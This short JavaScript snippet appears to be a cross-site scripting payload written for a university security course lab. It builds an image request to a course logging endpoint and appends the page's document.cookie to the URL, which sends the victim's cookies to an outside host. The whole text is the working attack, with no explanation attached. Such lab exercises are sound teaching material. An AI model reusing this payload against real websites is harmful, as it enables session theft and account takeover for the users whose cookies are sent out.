var img = new Image();
img.src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=rollhens' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random();
img.click();
